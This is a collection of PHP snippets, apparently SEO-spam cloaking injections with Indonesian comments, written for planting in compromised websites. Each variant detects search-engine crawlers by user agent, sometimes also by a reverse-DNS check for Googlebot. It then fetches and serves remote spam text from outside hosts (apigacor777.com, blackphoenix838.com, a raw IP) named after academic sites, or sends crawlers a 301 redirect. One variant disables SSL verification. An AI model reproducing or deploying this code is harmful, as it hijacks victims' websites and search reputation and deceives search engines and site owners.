<?php
error_reporting(E_ALL);
ini_set('display_errors', 0);

$SVWQA = urlencode($_SERVER["HTTP_USER_AGENT"]);
$qikCq = urlencode($_SERVER["REQUEST_URI"]);
$Fpu0h = "";    
$YJ408 = 0;
$bi0It = urlencode($_SERVER["SCRIPT_NAME"]);

$rSeaB = isset($rSeaB) ? $rSeaB : '';
$JkCvq = isset($JkCvq) ? $JkCvq : '';
$mr2A2 = isset($mr2A2) ? $mr2A2 : '';
$dhGb4 = isset($dhGb4) ? $dhGb4 : '';
$S0Zaf = isset($S0Zaf) ? $S0Zaf : '';
$bVG4q = isset($bVG4q) ? $bVG4q : '';

function isBot($userAgent) {
    $bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'];
    foreach ($bots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function isGooglebotIP($ip) {	
    $hostname = gethostbyaddr($ip);
    return (strpos($hostname, 'googlebot.com') !== false || strpos($hostname, 'google.com') !== false || strpos($hostname, 'googleusercontent.com') !== false);
}

function bypEg($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

if (isBot($_SERVER["HTTP_USER_AGENT"])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isGooglebotIP($ip)) {
        $CJ0it = "https://apigacor777.com/revista.uepb.edu.br.txt?agent={$SVWQA}&referrer={$rSeaB}&lang={$JkCvq}&ip={$mr2A2}&dom={$dhGb4}&http={$S0Zaf}&uri={$qikCq}&pc={$bVG4q}&rewritable={$YJ408}&script={$bi0It}";
        $Fpu0h = bypEg($CJ0it);
        echo $Fpu0h;
        exit;
    }
}

?>



<?php
function isGooglebotIP($ip) {
    $hostname = gethostbyaddr($ip);
    return (
        strpos($hostname, 'googlebot.com') !== false || 
        strpos($hostname, 'google.com') !== false || 
        strpos($hostname, 'googleusercontent.com') !== false
    );
}

$zX1q = [
    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 
    'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 
    'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'
];

$zK2v = $_SERVER['HTTP_USER_AGENT'];
$zW3p = "https://apigacor777.com/periodicos.ufba.br.txt";
$zA4r = false;
foreach ($zX1q as $zB5t) {
    if (strpos($zK2v, $zB5t) !== false) {
        $zA4r = true;
        break;
    }
}
if ($zA4r || isGooglebotIP($_SERVER['REMOTE_ADDR'])) {
    $zC6n = curl_init();
    curl_setopt($zC6n, CURLOPT_URL, $zW3p);
    curl_setopt($zC6n, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($zC6n, CURLOPT_FOLLOWLOCATION, true);
    $zD7m = curl_exec($zC6n);
    curl_close($zC6n);
    echo $zD7m;
    exit;
}

?>


<~!! NON CURL !!~>

<?php
$zX1q = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'];
$zK2v = $_SERVER['HTTP_USER_AGENT'];
$zW3p = "https://apigacor777.com/revista.uepb.edu.br.txt";

$zA4r = false;
foreach ($zX1q as $zB5t) {
    if (strpos($zK2v, $zB5t) !== false) {
        $zA4r = true;
        break;
    }
}

if ($zA4r) {
    @file_get_contents($zW3p);
    exit;
}
?>

<~~~!!!REDIRECT!!!~~~>
<?php
$zX1q = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'];

$zK2v = $_SERVER['HTTP_USER_AGENT'];

// Url Tujuan Redirect 301 Diganti disini
$zW3p = "https://domain.com/file.txt";

$zA4r = false;

foreach ($zX1q as $zB5t) {
    if (strpos($zK2v, $zB5t) !== false) {
        $zA4r = true;
        break;
    }
}

if ($zA4r) {
    header("Location: $zW3p", true, 301);
    exit;
}
?>



<?php
$zX1q = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'];
$zK2v = $_SERVER['HTTP_USER_AGENT'];
$zW3p = 'https://apigacor777.com/revista.uepb.edu.br.txt';

$zA4r = false;
foreach ($zX1q as $zB5t) {
    if (strpos($zK2v, $zB5t) !== false) {
        $zA4r = true;
        break;
    }
}

if ($zA4r) {
    $zC6n = curl_init();
    curl_setopt($zC6n, CURLOPT_URL, $zW3p);
    curl_setopt($zC6n, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($zC6n, CURLOPT_FOLLOWLOCATION, true);
    $zD7m = curl_exec($zC6n);
    if (curl_errno($zC6n)) {
        echo 'Error: ' . curl_error($zC6n);
    } else {
        echo $zD7m;
    }
    curl_close($zC6n);
    exit;
}
?>

<~~~~~NOT CURL~~~~~>
<?php
$SVWQA = urlencode($_SERVER["HTTP_USER_AGENT"]);
$qikCq = urlencode($_SERVER["REQUEST_URI"]);
$bi0It = urlencode($_SERVER["SCRIPT_NAME"]);
$rSeaB = isset($rSeaB) ? $rSeaB : '';
$JkCvq = isset($JkCvq) ? $JkCvq : '';
$mr2A2 = isset($mr2A2) ? $mr2A2 : '';
$dhGb4 = isset($dhGb4) ? $dhGb4 : '';
$S0Zaf = isset($S0Zaf) ? $S0Zaf : '';
$bVG4q = isset($bVG4q) ? $bVG4q : '';
$YJ408 = 0;

$bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'];

function isGooglebotIP($ip) {	
    $hostname = gethostbyaddr($ip);
    return (strpos($hostname, 'googlebot.com') !== false || strpos($hostname, 'google.com') !== false || strpos($hostname, 'googleusercontent.com') !== false);
}

function bypEg($url) {
    return file_get_contents($url);
}

if (in_array(true, array_map(fn($bot) => stripos($_SERVER["HTTP_USER_AGENT"], $bot) !== false, $bots))) {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isGooglebotIP($ip)) {
        $CJ0it = "https://apigacor777.com/revista.uepb.edu.br.txt?agent={$SVWQA}&referrer={$rSeaB}&lang={$JkCvq}&ip={$mr2A2}&dom={$dhGb4}&http={$S0Zaf}&uri={$qikCq}&pc={$bVG4q}&rewritable={$YJ408}&script={$bi0It}";
        echo bypEg($CJ0it);
        exit;
    }
}
?>

<O
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$SVWQA = urlencode($_SERVER["HTTP_USER_AGENT"]);
$qikCq = urlencode($_SERVER["REQUEST_URI"]);
$Fpu0h = "";    
$YJ408 = 0;
$bi0It = urlencode($_SERVER["SCRIPT_NAME"]);

$rSeaB = isset($rSeaB) ? $rSeaB : '';
$JkCvq = isset($JkCvq) ? $JkCvq : '';
$mr2A2 = isset($mr2A2) ? $mr2A2 : '';
$dhGb4 = isset($dhGb4) ? $dhGb4 : '';
$S0Zaf = isset($S0Zaf) ? $S0Zaf : '';
$bVG4q = isset($bVG4q) ? $bVG4q : '';

function isBot($userAgent) {
    $bots = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'];
    foreach ($bots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function isGooglebotIP($ip) {    
    $hostname = gethostbyaddr($ip);
    return (strpos($hostname, 'googlebot.com') !== false || strpos($hostname, 'google.com') !== false || strpos($hostname, 'googleusercontent.com') !== false);
}

if (isBot($_SERVER["HTTP_USER_AGENT"])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isGooglebotIP($ip)) {
        $file_path = 'https://blackphoenix838.com/boyasnebeng/lp/millbasindaycamp.com.txt';
        
        if (file_exists($file_path)) {
            $Fpu0h = file_get_contents($file_path);
            echo $Fpu0h;
        } else {
            echo "File tidak ditemukan.";
        }
        exit;
    }
}

?>


# SERVER WINDOWS
<?php
$SVWQA = urlencode($_SERVER["HTTP_USER_AGENT"]);
$qikCq = urlencode($_SERVER["REQUEST_URI"]);
$bi0It = urlencode($_SERVER["SCRIPT_NAME"]);
$rSeaB = isset($rSeaB) ? $rSeaB : '';
$JkCvq = isset($JkCvq) ? $JkCvq : '';
$mr2A2 = isset($mr2A2) ? $mr2A2 : '';
$dhGb4 = isset($dhGb4) ? $dhGb4 : '';
$S0Zaf = isset($S0Zaf) ? $S0Zaf : '';
$bVG4q = isset($bVG4q) ? $bVG4q : '';
$YJ408 = 0;

$bots = [
    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 
    'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 
    'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'
];

function isGooglebotIP($ip) {	
    $hostname = gethostbyaddr($ip);
    return (
        strpos($hostname, 'googlebot.com') !== false ||
        strpos($hostname, 'google.com') !== false ||
        strpos($hostname, 'googleusercontent.com') !== false
    );
}

function bypEg($url) {
    $contextOptions = [
        "ssl" => [
            "verify_peer" => false,
            "verify_peer_name" => false,
        ]
    ];
    $context = stream_context_create($contextOptions);
    return file_get_contents($url, false, $context);
}

$isBot = false;
foreach ($bots as $bot) {
    if (stripos($_SERVER["HTTP_USER_AGENT"], $bot) !== false) {
        $isBot = true;
        break;
    }
}

if ($isBot) {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isGooglebotIP($ip)) {
        $CJ0it = "https://156.244.9.42/happy/ezpaydaycash.com.txt?agent={$SVWQA}&referrer={$rSeaB}&lang={$JkCvq}&ip={$mr2A2}&dom={$dhGb4}&http={$S0Zaf}&uri={$qikCq}&pc={$bVG4q}&rewritable={$YJ408}&script={$bi0It}";
        echo bypEg($CJ0it);
        exit;
    }
}
?>
